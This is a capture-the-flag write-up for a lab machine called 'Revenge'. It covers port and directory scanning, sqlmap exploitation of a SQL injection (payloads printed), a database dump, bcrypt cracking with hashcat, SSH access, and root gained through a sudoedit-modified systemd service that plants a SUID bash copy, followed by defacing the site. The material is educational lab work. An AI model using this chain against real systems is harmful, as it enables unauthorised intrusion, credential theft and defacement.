> Revenge 

**export IP=10.10.22.142**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
```

# Gobuster

sudo gobuster -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/initial -x txt,php,html,bak,sql,py -t 20

```
/admin (Status: 200)
/app.py (Status: 200)
/contact (Status: 200)
/index (Status: 200)
/login (Status: 200)
/products (Status: 200)
/requirements.txt (Status: 200)
```

In app.py, we have a SQL vulnerability for path product since it is passed directly to command. Let's try sqlmap for sqli.

# SQLMAP

sqlmap -u "http://$IP//products/1*" --batch

```
sqlmap identified the following injection point(s) with a total of 114 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.22.142:80//products/1 AND 8106=8106

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.22.142:80//products/1 AND (SELECT 3548 FROM (SELECT(SLEEP(5)))JiVH)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.22.142:80//products/-6822 UNION ALL SELECT 94,94,94,94,94,94,94,CONCAT(0x71707a6b71,0x6a724a7262704c44694c6b735643556747574465554c516347625758734654766c514f7759427864,0x716a6a6a71)-- -
```

# Enumerating Database

sqlmap -u "http://$IP//products/1*" --batch -risk 3 --level 5 --dbs

```
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

# Enumerating Tables

sqlmap -u "http://$IP//products/1*" --batch -risk 3 --level 5 -D duckyinc --tables

```
Database: duckyinc                                                             
[3 tables]
+-------------+
| system_user |
| user        |
| product     |
+-------------+
```

# Dumping data

sqlmap -u "http://$IP//products/1*" --batch -risk 3 --level 5 -D duckyinc --dump


# Flag 1 - From the dump

`thm{br3ak1ng_4nd_3nt3r1ng}`

And one user is suscpicious 

| 1    | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |

# Cracking the password

hashcat -m 3200 /snap/john-the-ripper/rockyou.txt hash  --user --force

```
$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a:inuyasha
```

We can SSH using that password

# Flag 2 

```
thm{4lm0st_th3re}
```

# Privilege Escalation

sudo -l

```
User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable
        duckyinc.service, /bin/systemctl restart duckyinc.service,
        /bin/systemctl daemon-reload, sudoedit
        /etc/systemd/system/duckyinc.service
```

Let's change the configuration file and we can restart the service. Let's create a shell!

## shell.sh

```
#!/bin/bash

cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
```

And now let's change the duckyinc.service file 

```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /home/server-admin/shell.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

# Restart the service

```
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl enable duckyinc.service
sudo /bin/systemctl restart duckyinc.service
```

We have /tmp/bash. `/tmp/bash -p` gives us root!! But we don't have the flag there. Let's see the challenge objectives it says deface the website 

```
mv /var/www/duckyinc/templates/index.html /dev/shm/
```

And now we check /root we have flag3.txt

```
thm{m1ss10n_acc0mpl1sh3d}
```